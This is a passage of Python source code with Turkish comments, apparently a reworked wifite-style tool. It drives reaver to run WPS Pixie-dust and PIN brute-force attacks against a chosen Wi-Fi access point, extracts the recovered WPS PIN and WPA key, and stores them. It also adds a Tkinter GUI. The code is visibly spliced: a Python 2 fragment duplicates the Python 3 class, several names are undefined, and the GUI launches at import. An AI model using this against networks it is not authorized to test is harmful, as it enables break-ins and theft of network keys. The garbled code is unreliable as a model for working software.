                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)
            else:
                print GR + '\n [+]' + R + ' Saldırı başarısız.' + W

        except KeyboardInterrupt:
            print R + '\n (^C)' + O + ' WPS Pixie saldırısı kesildi' + W
            if attack_interrupted_prompt():
                send_interrupt(proc)
                print ''
                self.RUN_CONFIG.exit_gracefully(0)

        send_interrupt(proc)

        # Dosyaları sil
        if os.path.exists(output_file): os.remove(output_file)
        if os.path.exists(pixie_file): os.remove(pixie_file)

        return cracked


    def attack_wps(self):
        """
            Hedefe karşı PIN brute force saldırısını gerçekleştirir.
            PIN bulunduktan sonra PSK geri alınabilir.
            PSK kullanıcıya gösterilir ve WPS_FINDINGS'e eklenir.
        """
        print GR + ' [0:00:00]' + W + ' %sWPS PIN saldırısı%s başlatılıyor: %s' % \
                                      (G, W, G + self.target.ssid + W + ' (' + G + self.target.bssid + W + ')' + W)

        output_file = os.path.join(self.RUN_CONFIG.temp, 'out.out')
        cmd = ['reaver',
               '-i', self.iface,
               '-b', self.target.bssid,
               '-o', output_file,  # Çıktıyı dosyaya dök
               '-c', self.target.channel,
               '-vv']  # Ayrıntılı çıktı
        proc = Popen(cmd, stdout=DN, stderr=DN)

        cracked = False  # Parola/pin bulunma bayrağı
        percent = 'x.xx%'  # Tamamlanma yüzdesi
        aps = 'x'  # Her deneme için geçen süre
        time_started = time.time()
        last_success = time_started  # Son başarılı denemenin zamanı
        last_pin = ''  # Son denenen PIN (tekrarları tespit etmek için)
        retries = 0  # Bu PIN ile kaç kez deneme yapıldı
        tries_total = 0  # Tüm PIN denemeleri sayısı
        tries = 0  # Bu denemede PIN denemeleri sayısı
        pin = ''
        key = ''
#################
# WPS FUNC. #
#################

import os
import time
import subprocess
from subprocess import Popen, PIPE

class WPSAttack:
    def __init__(self, iface, target, config):
        self.iface = iface
        self.target = target
        self.RUN_CONFIG = config

    def RunAttack(self):
        """
            WPS saldırısını başlatır.
        """
        if self.is_pixie_supported():
            # Pixie-dust saldırısını dene
            if self.attack_wps_pixie():
                # Başarılı olursa dur
                return True

        # Kullanıcı sadece pixie saldırısının çalıştırılmasını belirtmişse çık
        if self.RUN_CONFIG.PIXIE:
            return False

        # WPS PIN saldırısını dene
        return self.attack_wps()

    def EndAttack(self):
        """
            WPS saldırısını bitirir.
        """
        # Ek işlevler eklenebilir: Temizlik, raporlama vb.
        print('Saldırı sona erdi.')

    def is_pixie_supported(self):
        """
            Mevcut Reaver sürümünün pixie-dust saldırısını destekleyip desteklemediğini kontrol eder.
        """
        p = Popen(['reaver', '-h'], stdout=PIPE, stderr=PIPE)
        stdout, _ = p.communicate()
        return '--pixie-dust' in stdout.decode()

    def attack_wps_pixie(self):
        """
            Pixie-dust saldırısını denemek için Reaver'ı kullanır.
        """
        output_file = os.path.join(self.RUN_CONFIG.temp, 'pixie_output.out')
        pixie_file = os.path.join(self.RUN_CONFIG.temp, 'pixie.err')

        print(f'{G} [0:00:00]{W} Pixie-dust WPS saldırısı başlatılıyor: {G}{self.target.ssid} ({self.target.bssid}){W}')
        cmd = ['reaver', '-i', self.iface, '-b', self.target.bssid, '-c', self.target.channel, '-K', '1', '-vv']

        outf = open(output_file, 'a')
        errf = open(pixie_file, 'a')

        proc = Popen(cmd, stdout=outf, stderr=errf)

        cracked = False
        pin = ''
        key = ''
        start_time = time.time()

        try:
            while not cracked:
                time.sleep(1)
                if proc.poll() is not None:
                    inf = open(output_file, 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        if "WPS PIN: '" in line:
                            pin = line.split("WPS PIN: '")[1].split("'")[0]
                            cracked = True
                        if "WPA PSK: '" in line:
                            key = line.split("WPA PSK: '")[1].split("'")[0]
                        if "WPS pin:  " in line:
                            pin = line.split("WPS pin:  ")[1]
                            cracked = True
                        if "WPA PSK:  " in line:
                            key = line.split("WPA PSK:  ")[1]

                    if 'Pixie-Dust' in line and 'WPS pin not found' in line:
                        print(f'\r {GR} Pixie-dust saldırısı başarısız - WPS pin bulunamadı{W}')
                        break
                    break

                print(f'\r {GR} Pixie-dust WPS saldırısı:', end='')
                if not os.path.exists(output_file): continue
                inf = open(output_file, 'r')
                lines = inf.read().split('\n')
                inf.close()

                output_line = ''
                for line in lines:
                    line = line.replace('[+]', '').replace('[!]', '').strip()
                    if len(line) > 50:
                        line = line[:47] + '...'
                    output_line = line

                if 'Sending M2 message' in output_line:
                    print(f'{O}M2 mesajı gönderiliyor (bir süre alabilir)...{W}', end='')
                elif output_line:
                    print(f'{C}{output_line}{W}', end='')

                stdout.flush()

                inf = open(output_file, 'w')
                inf.close()

            if cracked:
                if pin:
                    print(f'{GR}\n\n [+]{G} PIN bulundu: {C}{pin}{W}')
                if key:
                    print(f'{GR} [+] {G}WPA anahtarı bulundu: {C}{key}{W}')
                else:
                    key = 'Yok'

                self.RUN_CONFIG.WPA_FINDINGS.append(f'{W}Bulundu {G}{self.target.ssid}{W}\'nin WPA anahtarı: "{C}{key}{W}", WPS PIN: {C}{pin}{W}')
                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)
            else:
                print(f'{GR}\n [+]{R} Saldırı başarısız.{W}')

        except KeyboardInterrupt:
            print(f'{R}\n (^C){O} Pixie-dust saldırısı kesildi{W}')
            if self.attack_interrupted_prompt():
                self.send_interrupt(proc)
                print('')
                self.RUN_CONFIG.exit_gracefully(0)

        self.send_interrupt(proc)

        if os.path.exists(output_file): os.remove(output_file)
        if os.path.exists(pixie_file): os.remove(pixie_file)

        return cracked

    def attack_wps(self):
        """
            WPS PIN brute force saldırısını başlatır.
        """
        print(f'{GR} [0:00:00]{W} WPS PIN saldırısı başlatılıyor: {G}{self.target.ssid} ({self.target.bssid}){W}')

        output_file = os.path.join(self.RUN_CONFIG.temp, 'wps_output.out')
        cmd = ['reaver', '-i', self.iface, '-b', self.target.bssid, '-o', output_file, '-c', self.target.channel, '-vv']
        proc = Popen(cmd, stdout=PIPE, stderr=PIPE)

        cracked = False
        pin = ''
        key = ''
        start_time = time.time()

        try:
            while not cracked:
                time.sleep(1)
                if proc.poll() is not None:
                    inf = open(output_file, 'r')
                    lines = inf.read().split('\n')
                    inf.close()
                    for line in lines:
                        if "WPS PIN: '" in line:
                            pin = line.split("WPS PIN: '")[1].split("'")[0]
                            cracked = True
                        if "WPA PSK: '" in line:
                            key = line.split("WPA PSK: '")[1].split("'")[0]
                        if "WPS pin:  " in line:
                            pin = line.split("WPS pin:  ")[1]
                            cracked = True
                        if "WPA PSK:  " in line:
                            key = line.split("WPA PSK:  ")[1]

                    if 'Error: No WPS pin found' in lines:
                        print(f'\r {GR} WPS PIN saldırısı başarısız - WPS pin bulunamadı{W}')
                        break
                    break

                print(f'\r {GR} WPS PIN saldırısı:', end='')
                if not os.path.exists(output_file): continue
                inf = open(output_file, 'r')
                lines = inf.read().split('\n')
                inf.close()

                output_line = ''
                for line in lines:
                    line = line.replace('[+]', '').replace('[!]', '').strip()
                    if len(line) > 50:
                        line = line[:47] + '...'
                    output_line = line

                if 'Sending M2 message' in output_line:
                    print(f'{O}M2 mesajı gönderiliyor (bir süre alabilir)...{W}', end='')
                elif output_line:
                    print(f'{C}{output_line}{W}', end='')

                stdout.flush()

                inf = open(output_file, 'w')
                inf.close()

            if cracked:
                if pin:
                    print(f'{GR}\n\n [+]{G} PIN bulundu: {C}{pin}{W}')
                if key:
                    print(f'{GR} [+] {G}WPA anahtarı bulundu: {C}{key}{W}')
                else:
                    key = 'Yok'

                self.RUN_CONFIG.WPA_FINDINGS.append(f'{W}Bulundu {G}{self.target.ssid}{W}\'nin WPA anahtarı: "{C}{key}{W}", WPS PIN: {C}{pin}{W}')
                t = Target(self.target.bssid, 0, 0, 0, 'WPA', self.target.ssid)
                t.key = key
                t.wps = pin
                self.RUN_CONFIG.save_cracked(t)
            else:
                print(f'{GR}\n [+]{R} Saldırı başarısız.{W}')

        except KeyboardInterrupt:
            print(f'{R}\n (^C){O} WPS PIN saldırısı kesildi{W}')
            if self.attack_interrupted_prompt():
                self.send_interrupt(proc)
                print('')
                self.RUN_CONFIG.exit_gracefully(0)

        self.send_interrupt(proc)

        if os.path.exists(output_file): os.remove(output_file)

        return cracked

    def attack_interrupted_prompt(self):
        """
            Kullanıcıya saldırının kesildiğini doğrulamak için bir iletişim kutusu gösterir.
        """
        response = input('Saldırı kesildi. Devam etmek istiyor musunuz? (E/H): ')
        return response.lower() == 'e'

    def send_interrupt(self, proc):
        """
            Çalışan sürece kesinti sinyali gönderir.
        """
        if proc:
            proc.terminate()
            proc.wait()

#################
# GUI / Web #
#################

import tkinter as tk
from tkinter import messagebox

class WPSGUI:
    def __init__(self, master):
        self.master = master
        master.title("WPS Saldırı Aracı")

        # Arayüz elemanları
        self.label = tk.Label(master, text="WPS Saldırı Aracı", font=("Arial", 16))
        self.label.pack()

        self.start_button = tk.Button(master, text="Saldırıyı Başlat", command=self.start_attack)
        self.start_button.pack()

        self.quit_button = tk.Button(master, text="Çıkış", command=master.quit)
        self.quit_button.pack()

        self.status_label = tk.Label(master, text="", font=("Arial", 12))
        self.status_label.pack()

        self.attack_output = tk.Text(master, height=10, width=50)
        self.attack_output.pack()

    def start_attack(self):
        try:
            # Saldırıyı başlat
            self.status_label.config(text="Saldırı başlatılıyor...")
            self.attack_output.delete(1.0, tk.END)
            print("Saldırı başlatılıyor...")
            # Burada saldırı fonksiyonunu çağırın
            # WPSAttack(iface, target, config).RunAttack()
            self.attack_output.insert(tk.END, "Saldırı başlatıldı ve devam ediyor...\n")
            self.status_label.config(text="Saldırı başlatıldı ve devam ediyor...")
            messagebox.showinfo("Başarı", "Saldırı başlatıldı.")
        except Exception as e:
            self.attack_output.insert(tk.END, f"Saldırı başlatılamadı: {e}\n")
            messagebox.showerror("Hata", f"Saldırı başlatılamadı: {e}")

root = tk.Tk()
gui = WPSGUI(root)
root.mainloop()

#################
# MAIN #
#################

if __name__ == '__main__':
    RUN_CONFIG = RunConfiguration()
    try:
        banner(RUN_CONFIG)
        engine = RunEngine(RUN_CONFIG)
        engine.Start()
        #main(RUN_CONFIG)
    except KeyboardInterrupt:
        print(R + '\n (^C)' + O + ' kesildi\n' + W)
    except EOFError:
        print(R + '\n (^D)' + O + ' kesildi\n' + W)

    RUN_CONFIG.exit_gracefully(0)
